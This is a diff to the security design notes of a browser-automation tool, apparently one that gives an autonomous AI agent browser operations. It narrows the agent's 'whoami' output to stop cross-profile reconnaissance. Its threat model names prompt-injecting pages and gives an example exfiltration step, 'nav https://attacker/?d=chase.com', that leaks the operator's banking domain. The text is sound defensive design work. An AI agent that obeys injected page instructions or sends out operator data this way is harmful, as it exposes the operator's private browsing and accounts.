@@ -498,6 +498,22 @@ with TYPED arguments — `op` ∈ {`text`,`html`,`eval`,`nav`,`screenshot`,`fram
 `maxBytes`/`waitMs` — **never a shell command string, and never a raw-CDP `cdp`/`method`
 field** (the CDP ops are bounded typed ops only; see the CDP security model above).
 
+- **The agent's `whoami` is NARROWED — no cross-profile reconnaissance.** The
+  server's `whoami_snapshot` iterates every live instance, so a bare passthrough
+  would tell the autonomous model what the operator is browsing in *unrelated*
+  profiles. The tool's summarizer therefore drops `activeTabDomain` outright (for
+  every instance, including the agent's own) and lists only the agent's OWN forced
+  instance (`BROWSER_AGENT_INSTANCE`, matched by key or label; an unmatched value
+  yields an empty list rather than falling back to "all"). The git HEAD inside
+  `server_version` is dropped too — only the version string survives. Why it
+  matters: with no `--allow-domains` set, `hostDenied()` permits any host, so a
+  leaked `{label:"banking", activeTabDomain:"chase.com"}` is one
+  `nav https://attacker/?d=chase.com` away from exfil by a model that is by design
+  reading prompt-injecting pages. This is the same leak that keeps `tabs` out of
+  the agent's op set ("`tabs` would leak other tabs' URLs"); `whoami` had
+  reintroduced a narrower version of it. The op's stated purpose — *which host and
+  which profile am I on* — is fully intact. The `browser whoami` CLI is unchanged;
+  the operator still sees everything.
 - **`upload` is NOT in the agent's op set** (11 ops, above — no `upload`). The
   `browser` CLI keeps it: an operator choosing a path by hand is a legitimate,
   audit-logged action. The autonomous model is different — it is by design pointed
